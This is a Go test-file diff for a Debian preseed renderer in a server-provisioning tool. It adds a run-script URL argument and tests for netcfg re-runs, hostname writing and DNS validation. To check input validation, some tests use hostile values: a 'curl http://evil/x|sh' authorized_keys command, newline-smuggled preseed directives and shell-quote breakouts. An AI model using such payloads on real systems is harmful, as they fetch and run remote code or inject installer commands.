@@ -5,6 +5,12 @@ import (
 	"testing"
 )
 
+// testRunURL is the preseed/run URL every test below hands to
+// RenderPreseed that isn't itself about that URL. It has the shape
+// MediaHandler's /preseed/{name} route serves: the same 32-hex token as the
+// preseed beside it, ".sh".
+const testRunURL = "http://192.168.2.50:8081/preseed/0123456789abcdef0123456789abcdef.sh"
+
 func goodSpec() Spec {
 	return Spec{
 		UID:      "b3f1c2d4-0000-4000-8000-000000000001",
@@ -28,7 +34,7 @@ func goodSpec() Spec {
 // signal is satisfied by the machine we believed we were overwriting and in
 // fact never touched.
 func TestRenderPreseedWritesTheUIDMarker(t *testing.T) {
-	got, err := RenderPreseed(goodSpec())
+	got, err := RenderPreseed(goodSpec(), testRunURL)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -41,7 +47,7 @@ func TestRenderPreseedWritesTheUIDMarker(t *testing.T) {
 }
 
 func TestRenderPreseedCarriesTheStaticNetwork(t *testing.T) {
-	got, err := RenderPreseed(goodSpec())
+	got, err := RenderPreseed(goodSpec(), testRunURL)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -84,7 +90,7 @@ func TestRenderPreseedRefusesAWholeKeyFile(t *testing.T) {
 	} {
 		s := goodSpec()
 		s.SSHPublicKey = key
-		if _, err := RenderPreseed(s); err == nil {
+		if _, err := RenderPreseed(s, testRunURL); err == nil {
 			t.Errorf("%s: a value carrying private key material was accepted", name)
 		}
 	}
@@ -96,7 +102,7 @@ func TestRenderPreseedRefusesAWholeKeyFile(t *testing.T) {
 func TestRenderPreseedSaysSoWhenTheValueIsPrivateKeyMaterial(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + "\n-----BEGIN OPENSSH PRIVATE KEY-----"
-	_, err := RenderPreseed(s)
+	_, err := RenderPreseed(s, testRunURL)
 	if err == nil {
 		t.Fatal("want an error, got nil")
 	}
@@ -113,7 +119,7 @@ func TestRenderPreseedRefusesAKeyThatCouldBreakOutOfThePreseedShell(t *testing.T
 	for _, comment := range []string{"don't", `back\slash`} {
 		s := goodSpec()
 		s.SSHPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILsytToxkJ2CiWuiv8BZ3hYpu7tFXn7Rwz+kc2gjbPSy " + comment
-		if _, err := RenderPreseed(s); err == nil {
+		if _, err := RenderPreseed(s, testRunURL); err == nil {
 			t.Errorf("comment %q was accepted; it breaks out of the shell quoting", comment)
 		}
 	}
@@ -126,7 +132,7 @@ func TestRenderPreseedRefusesAKeyThatCouldBreakOutOfThePreseedShell(t *testing.T
 func TestRenderPreseedRefusesASecondKeyHiddenInTheCommentField(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + " " + s.SSHPublicKey
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("two keys on one line were accepted")
 	}
 }
@@ -134,7 +140,7 @@ func TestRenderPreseedRefusesASecondKeyHiddenInTheCommentField(t *testing.T) {
 func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + " " + strings.Repeat("x", 1024)
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("a 1100-character value was accepted")
 	}
 }
@@ -142,7 +148,7 @@ func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
 func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = "hunter2"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a non-key, got nil")
 	}
 }
@@ -156,7 +162,7 @@ func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
 func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = `command="curl http://evil/x|sh",no-pty ` + s.SSHPublicKey
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a key carrying authorized_keys options, got nil")
 	}
 }
@@ -166,7 +172,7 @@ func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
 func TestRenderPreseedNeverEmitsTheJoinToken(t *testing.T) {
 	s := goodSpec()
 	s.Cluster = ClusterTarget{Mode: ClusterJoin, ServerURL: "https://192.168.2.201:6443", JoinToken: "K10SECRETTOKEN", K3sVersion: "v1.33.4+k3s1"}
-	got, err := RenderPreseed(s)
+	got, err := RenderPreseed(s, testRunURL)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -178,7 +184,7 @@ func TestRenderPreseedNeverEmitsTheJoinToken(t *testing.T) {
 // The installer refuses on the machine if the named disk is not the size Frame
 // was told it is.
 func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
-	got, err := RenderPreseed(goodSpec())
+	got, err := RenderPreseed(goodSpec(), testRunURL)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -200,7 +206,7 @@ func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
 func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
 	s := goodSpec()
 	s.UID = ""
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for empty UID, got nil")
 	}
 }
@@ -208,7 +214,7 @@ func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
 func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = ""
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for empty hostname, got nil")
 	}
 }
@@ -216,7 +222,7 @@ func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
 func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
 	s := goodSpec()
 	s.Network.Address = "not-a-cidr"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a malformed network address, got nil")
 	}
 }
@@ -227,7 +233,7 @@ func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
 func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
 	s := goodSpec()
 	s.Network.Address = "2001:db8::1/64"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a non-IPv4 network address, got nil")
 	}
 }
@@ -235,7 +241,7 @@ func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
 func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
 	s := goodSpec()
 	s.Network.Gateway = "not-an-ip"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a malformed gateway, got nil")
 	}
 }
@@ -250,7 +256,7 @@ func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
 func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\nd-i partman/confirm boolean true"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a hostname containing a newline, got nil")
 	}
 }
@@ -266,7 +272,7 @@ func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
 func TestRenderPreseedNamesTheNewlineWhenAValueBreaksADirective(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\nd-i partman/confirm boolean true"
-	_, err := RenderPreseed(s)
+	_, err := RenderPreseed(s, testRunURL)
 	if err == nil {
 		t.Fatal("want an error, got nil")
 	}
@@ -279,7 +285,7 @@ func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) 
 	for _, h := range []string{"g9'", `g9\`} {
 		s := goodSpec()
 		s.Hostname = h
-		if _, err := RenderPreseed(s); err == nil {
+		if _, err := RenderPreseed(s, testRunURL); err == nil {
 			t.Errorf("hostname %q was accepted; it breaks out of the shell quoting elsewhere in the preseed", h)
 		}
 	}
@@ -288,7 +294,108 @@ func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) 
 func TestRenderPreseedRefusesAHostnameContainingControlCharacters(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\x00"
-	if _, err := RenderPreseed(s); err == nil {
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
 		t.Fatal("want error for a hostname containing a control character, got nil")
+	}
+}
+
+// C1. The static-network block above this directive is inert on its own:
+// with url= preseeding, netcfg has already run over DHCP before this file
+// could be fetched at all. Without preseed/run the machine installs, comes
+// up on its DHCP address under a DHCP name, and Frame waits at an address
+// nobody is on -- after wiping every named disk.
+func TestRenderPreseedRunsNetcfgAgainAfterTheFileIsLoaded(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL)
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "d-i preseed/run string " + testRunURL
+	if !strings.Contains(got, want) {
+		t.Errorf("preseed does not carry %q, so every netcfg answer in it is inert:\n%s", want, got)
+	}
+}
+
+// The positive control for the test above: it proves the assertion is
+// looking at a value that actually varies with the argument, not at a
+// constant that would match whatever was passed.
+func TestRenderPreseedCarriesTheRunURLItWasGivenNotAFixedOne(t *testing.T) {
+	other := "http://10.0.0.1:9999/preseed/ffffffffffffffffffffffffffffffff.sh"
+	got, err := RenderPreseed(goodSpec(), other)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(got, "d-i preseed/run string "+other) {
+		t.Errorf("preseed does not carry the run URL it was given")
+	}
+	if strings.Contains(got, testRunURL) {
+		t.Errorf("preseed carries a run URL nobody passed it")
+	}
+}
+
+func TestRenderPreseedRefusesAnEmptyRunScriptURL(t *testing.T) {
+	if _, err := RenderPreseed(goodSpec(), "  "); err == nil {
+		t.Fatal("an empty preseed/run URL was accepted; the static network configuration would be inert")
+	}
+}
+
+func TestRenderPreseedRefusesARunScriptURLThatWouldBreakTheDirective(t *testing.T) {
+	if _, err := RenderPreseed(goodSpec(), "http://x/a.sh\nd-i foo/bar string baz"); err == nil {
+		t.Fatal("a run URL carrying a newline was accepted; in a preseed that starts a new directive")
+	}
+}
+
+// Debian: "any hostname and domain names assigned from dhcp take precedence
+// over values set here". netcfg/hostname is the documented force knob and
+// it is set -- but that only holds if the netcfg re-run above happens, and
+// that is unproven without hardware. This writes the name into the
+// installed system directly, where in-target already runs, so the node's
+// name does not depend on an unobserved ordering.
+func TestRenderPreseedWritesTheHostnameOntoTheInstalledSystem(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(got, "echo 'g9' > /target/etc/hostname") {
+		t.Errorf("preseed's late_command does not write /etc/hostname, so the node name depends on DHCP:\n%s", got)
+	}
+	if !strings.Contains(got, "d-i netcfg/hostname string g9") {
+		t.Errorf("preseed does not set netcfg/hostname, the knob that overrides a DHCP-supplied name")
+	}
+}
+
+// The content of what gets served. Asserted here so the serving test
+// (server_test.go) can compare against this constant rather than against a
+// second copy of the same string.
+func TestNetcfgRerunScriptKillsDHCPThenRunsNetcfg(t *testing.T) {
+	for _, want := range []string{"kill-all-dhcp", "netcfg"} {
+		if !strings.Contains(NetcfgRerunScript, want) {
+			t.Errorf("the preseed/run script does not contain %q:\n%s", want, NetcfgRerunScript)
+		}
+	}
+	if !strings.HasPrefix(NetcfgRerunScript, "#!/bin/sh\n") {
+		t.Errorf("the preseed/run script has no interpreter line:\n%s", NetcfgRerunScript)
+	}
+	if strings.Index(NetcfgRerunScript, "kill-all-dhcp") > strings.Index(NetcfgRerunScript, "\nnetcfg") {
+		t.Error("netcfg runs before the DHCP client is killed; the lease it is meant to replace is still held")
+	}
+}
+
+func TestRenderPreseedRefusesADNSEntryThatIsNotAnIP(t *testing.T) {
+	s := goodSpec()
+	s.Network.DNS = []string{"192.168.2.254", "resolver.example.com"}
+	if _, err := RenderPreseed(s, testRunURL); err == nil {
+		t.Fatal("a DNS entry that is not an IP address was accepted")
+	}
+}
+
+func TestRenderPreseedAcceptsAResolverListOfIPs(t *testing.T) {
+	s := goodSpec()
+	s.Network.DNS = []string{"192.168.2.254", "9.9.9.9"}
+	got, err := RenderPreseed(s, testRunURL)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(got, "netcfg/get_nameservers string 192.168.2.254 9.9.9.9") {
+		t.Errorf("preseed does not carry both resolvers:\n%s", got)
 	}
 }
